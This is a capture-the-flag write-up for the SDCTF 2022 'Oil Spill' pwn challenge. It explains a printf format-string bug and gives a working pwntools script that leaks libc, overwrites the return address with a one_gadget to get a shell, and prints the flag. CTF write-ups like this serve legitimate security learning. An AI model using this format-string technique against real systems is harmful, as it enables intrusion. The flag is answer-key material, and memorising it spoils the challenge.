---
title: "[Pwn] Oil Spill [SDCTF 2022]"
date: 2022-05-09 18:39:00
---

# 0x0 Introduction

Easy

Darn, these oil spills are going crazy nowadays. It looks like there's a little bit more than oil coming out of this program though...

Connect
nc oil.sdc.tf 1337

By green beans

files: [OilSpill](OilSpill)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

At start of the program, program leak libc address and stack address.

Then, the program uses `(*_reloc.printf)();`. We can use this printf to write whatever we want.

So the exploit would be overwriting the rip with libc one_gadget to get shell.

# 0x3 Exploit

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./OilSpill_patched")
libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("oil.sdc.tf", 1337)

    return r


def main():
    r = conn()
    if args.R2:
        input("wait")
    x = r.recvuntil(b"\n",drop=True).split(b", ")
    libc.address = int(x[0],16) - libc.sym["puts"]
    rip_address = int(x[2],16) + 0x148
    print("rip addr",hex(rip_address))
    print("libc base addr",hex(libc.address))
    one_gadget = libc.address+0x10a2fc
    print("one_gadget",hex(one_gadget))
    r.sendlineafter(b'clean it?\n',fmtstr_payload(8,{rip_address:one_gadget},write_size='short'))
    r.recvuntil(b"Proposition")
    r.interactive()


if __name__ == "__main__":
    main()

```

# 0x4 Flag

sdctf{th4nks_f0r_S4V1nG_tH3_duCk5}